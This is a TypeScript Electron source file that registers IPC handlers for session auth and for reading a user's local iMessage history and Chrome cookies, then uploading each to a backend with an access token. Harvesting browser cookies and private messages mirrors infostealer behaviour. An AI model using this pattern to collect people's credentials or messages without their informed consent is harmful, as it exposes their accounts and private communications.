import { ipcMain, BrowserWindow } from 'electron';
import { IMessageReader } from '../services/iMessageReader';
import { CookieReader } from '../services/cookieReader';
import { Uploader } from '../services/uploader';
import { AuthService } from '../services/auth';

export function registerHandlers() {
  // Auth handlers
  ipcMain.handle('auth:check', () => {
    return AuthService.getSession();
  });
  
  ipcMain.handle('auth:save', (_, session) => {
    AuthService.setSession(session);
    return { success: true };
  });
  
  ipcMain.handle('auth:clear', () => {
    AuthService.clearSession();
    return { success: true };
  });
  
  // iMessage handlers
  ipcMain.handle('imessage:checkAccess', () => {
    return IMessageReader.checkAccess();
  });
  
  ipcMain.handle('imessage:read', () => {
    return IMessageReader.readMessages();
  });
  
  ipcMain.handle('imessage:upload', async (event, data) => {
    const session = AuthService.getSession();
    if (!session) {
      return { success: false, message: 'Not authenticated' };
    }
    
    const window = BrowserWindow.fromWebContents(event.sender);
    return await Uploader.uploadData('imessage', data, session.access_token, window);
  });
  
  // Cookie handlers
  ipcMain.handle('cookies:readChrome', async () => {
    return await CookieReader.readCookies();
  });
  
  ipcMain.handle('cookies:upload', async (event, data) => {
    const session = AuthService.getSession();
    if (!session) {
      return { success: false, message: 'Not authenticated' };
    }
    
    const window = BrowserWindow.fromWebContents(event.sender);
    return await Uploader.uploadData('chrome_cookies', data, session.access_token, window);
  });
}

// Auto-register on import
registerHandlers();


